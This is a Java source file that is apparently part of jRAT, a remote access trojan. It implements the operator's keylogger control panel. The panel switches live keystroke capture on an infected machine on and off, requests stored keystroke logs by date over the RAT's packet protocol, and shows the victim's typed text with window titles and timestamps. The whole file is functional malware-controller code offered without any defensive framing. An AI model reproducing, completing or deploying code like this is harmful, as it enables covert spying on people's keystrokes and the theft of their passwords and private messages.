package jrat.plugin.keylogger.client.ui;

import java.awt.Color;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.DataInputStream;
import java.io.DataOutputStream;

import javax.swing.ButtonGroup;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.Icon;
import javax.swing.JCheckBox;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextPane;
import javax.swing.JToggleButton;
import javax.swing.JTree;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;

import jrat.api.Client;
import jrat.api.Icons;
import jrat.api.net.PacketBuilder;
import jrat.api.ui.BaseControlPanel;
import jrat.plugin.keylogger.client.HeartbeatThread;
import jrat.plugin.keylogger.client.KeyloggerPlugin;

@SuppressWarnings("serial")
public class PanelKeylogger extends BaseControlPanel {
	
	public JTextPane offlineTextPane;
	private final ButtonGroup buttonGroup = new ButtonGroup();
	private JCheckBox chckbxDeleteCharOn;
	
	private Style title;
	private Style date;

	private HeartbeatThread hb;
	private JTree tree;
	private JTextPane onlineTextPane;
	private DefaultMutableTreeNode root;

	public PanelKeylogger(Client client) {
		super(client);
		JToggleButton tglbtnEnable = new JToggleButton("Enable");
		tglbtnEnable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				hb = new HeartbeatThread(getClient());
				new Thread(hb).start();
			}
		});
		buttonGroup.add(tglbtnEnable);

		JToggleButton tglbtnDisable = new JToggleButton("Disable");
		tglbtnDisable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				hb.toggle();
				hb = null;
			}
		});
		buttonGroup.add(tglbtnDisable);
		tglbtnDisable.setSelected(true);

		chckbxDeleteCharOn = new JCheckBox("Delete char on backspace");

		JScrollPane scrollPane_1 = new JScrollPane();

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		
		JPopupMenu popupMenu = new JPopupMenu();
		
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(tglbtnEnable).addPreferredGap(ComponentPlacement.RELATED).addComponent(tglbtnDisable).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(chckbxDeleteCharOn)).addGroup(groupLayout.createSequentialGroup().addGap(1).addComponent(scrollPane_1, GroupLayout.PREFERRED_SIZE, 128, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 305, Short.MAX_VALUE))).addContainerGap()));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 359, Short.MAX_VALUE).addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 254, Short.MAX_VALUE)).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(tglbtnEnable).addComponent(tglbtnDisable).addComponent(chckbxDeleteCharOn)).addGap(15)));

		Icon offlineIcon = null;

		try {
			offlineIcon = Icons.getIcon("Keylogger", "/icons/offline.png");
		} catch (Exception e2) {
			e2.printStackTrace();
		}

		JScrollPane offlineScrollPane = new JScrollPane();
		tabbedPane.addTab("Offline", offlineIcon, offlineScrollPane, null);
		offlineScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		offlineScrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);

		offlineTextPane = new JTextPane();
		offlineTextPane.setEditable(false);
		offlineScrollPane.setViewportView(offlineTextPane);

		Icon onlineIcon = null;
		try {
			onlineIcon = Icons.getIcon("Keylogger", "/icons/online.png");
		} catch (Exception e1) {
			e1.printStackTrace();
		}

		JScrollPane onlineScrollPane = new JScrollPane();
		onlineScrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		onlineScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		tabbedPane.addTab("Online", onlineIcon, onlineScrollPane, null);

		onlineTextPane = new JTextPane();
		onlineTextPane.setEditable(false);
		onlineScrollPane.setViewportView(onlineTextPane);

		title = offlineTextPane.addStyle("title", null);
		onlineTextPane.addStyle("title", title);
		StyleConstants.setForeground(title, Color.green.darker());
		
		date = offlineTextPane.addStyle("date", null);
		onlineTextPane.addStyle("date", date);
		StyleConstants.setForeground(date, Color.blue);

		tree = new JTree();
		addPopup(tree, popupMenu);
		
		JMenuItem mntmReload = new JMenuItem("Reload");
		mntmReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				reloadLogs();
			}
		});
		
		popupMenu.add(mntmReload);
		tree.setCellRenderer(new TreeRenderer());
		tree.addTreeSelectionListener(new TreeSelectionListener() {
			public void valueChanged(TreeSelectionEvent event) {
				Object node = event.getPath().getLastPathComponent();

				if (node instanceof DayTreeNode) {							
					final YearTreeNode year = (YearTreeNode)event.getPath().getPath()[1];
					final MonthTreeNode month = (MonthTreeNode)event.getPath().getPath()[2];
					final DayTreeNode day = (DayTreeNode)event.getPath().getPath()[3];
					
					try {
						getClient().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getClient()) {
							@Override
							public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
								dos.writeUTF(year.toString());
								dos.writeUTF(month.toString());
								dos.writeUTF(day.toString());
							}
						});
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		});
		tree.setShowsRootHandles(true);
		root = new DefaultMutableTreeNode("Logs");
		tree.setModel(new DefaultTreeModel(root));
		scrollPane_1.setViewportView(tree);
		setLayout(groupLayout);

		reloadLogs();
	}

	public DefaultMutableTreeNode getRoot() {
		return root;
	}

	public synchronized void reloadLogs() {
		try {
			
			((DefaultMutableTreeNode)tree.getModel().getRoot()).removeAllChildren();
			
			getClient().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, getClient()) {
				@Override
				public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {

				}
			});
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public synchronized void delete() throws Exception {
		String text = offlineTextPane.getText().trim();
		if (text.endsWith("]")) {
			offlineTextPane.getStyledDocument().remove(text.lastIndexOf("["), text.lastIndexOf("]") - text.lastIndexOf("[") + 1);
		} else {
			offlineTextPane.getStyledDocument().remove(offlineTextPane.getDocument().getLength() - 1, 1);
		}
	}
	
	public void appendOffline(String key) {
		try {
			if (key.equals("[BACKSPACE]") && chckbxDeleteCharOn.isSelected()) {
				delete();
				return;
			} else if (key.startsWith("[Window:")) {
				offlineTextPane.getStyledDocument().insertString(offlineTextPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", title);
			} else if (key.startsWith("[Date:")) {
				offlineTextPane.getStyledDocument().insertString(offlineTextPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", date);
			} else {
				offlineTextPane.getStyledDocument().insertString(offlineTextPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public synchronized void appendOnline(String key) {
		try {
			if (key.equals("[BACKSPACE]") && chckbxDeleteCharOn.isSelected()) {
				delete();
				return;
			} else if (key.startsWith("[Window:")) {
				onlineTextPane.getStyledDocument().insertString(onlineTextPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", title);
			} else if (key.startsWith("[Date:")) {
				onlineTextPane.getStyledDocument().insertString(onlineTextPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", date);
			} else {
				onlineTextPane.getStyledDocument().insertString(onlineTextPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		onlineTextPane.setSelectionStart(onlineTextPane.getDocument().getLength());
		onlineTextPane.setSelectionEnd(onlineTextPane.getDocument().getLength());

	}

	@Override
	public void onClose() {

	}

	public JTree getTree() {
		return tree;
	}
	private static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}
			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}
